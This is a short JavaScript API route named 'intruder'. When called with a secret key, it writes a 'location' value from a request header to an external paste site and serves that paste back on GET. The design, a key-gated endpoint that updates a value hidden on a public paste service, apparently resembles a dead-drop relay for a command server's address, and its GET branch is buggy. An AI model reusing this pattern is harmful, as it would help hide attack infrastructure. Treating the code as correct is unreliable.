const fs = require('fs');

export default async function intruder(req, res) {
    const {locat} = req.headers;
    if (req.query.usagekey === process.env.special_key && req.method === "POST") {
        console.log(locat);
        fetch("https://www.klgrth.io/paste/bsvwf/edit", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Opera GX\";v=\"91\", \"Chromium\";v=\"105\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1"
            },
            "referrer": "https://www.klgrth.io/paste/bsvwf/edit",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": `lang=text&text=${locat}&expire=-1&password=&title=`,
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
        return res.status(200).json({message: "Location updated"});
    }
    if (req.method === "GET") {
        return res.status(200).json(fetch("https://www.klgrth.io/paste/bsvwf/raw").then(r => r.text()));
    } else {
        return res.status(404).json({message: "You cannot perform this action on this endpoint"});
    }
}